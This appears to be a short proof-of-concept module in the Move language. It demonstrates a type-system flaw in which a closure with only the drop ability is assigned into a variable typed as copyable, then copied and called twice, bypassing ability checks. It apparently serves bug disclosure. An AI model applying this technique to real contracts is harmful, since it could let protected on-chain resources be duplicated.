module poc::fv_ref {
    use std::debug;
    struct DropCopy has drop, copy;


    public fun assn<T: drop>(ref: &mut T, x: T){
        *ref = x;
    }

    public entry fun foo() {
        let x = DropCopy;

        // closure capturing x: DropCopy
        let a: ||u64 has drop = ||{
            std::debug::print(&1111);
            let DropCopy = x;
            1
        };

        // harmless copy+drop function
        let pwn: ||u64 has drop + copy = ||1;

        // swap them
        // 0x1::mem::replace<||u64 has drop + copy>(&mut pwn, a);
        assn<||u64 has drop + copy>(&mut pwn, a);

        // copy the closure with captured DropCopy
        let pwncopy = copy pwn;
        pwn();
        pwncopy();
    }
}
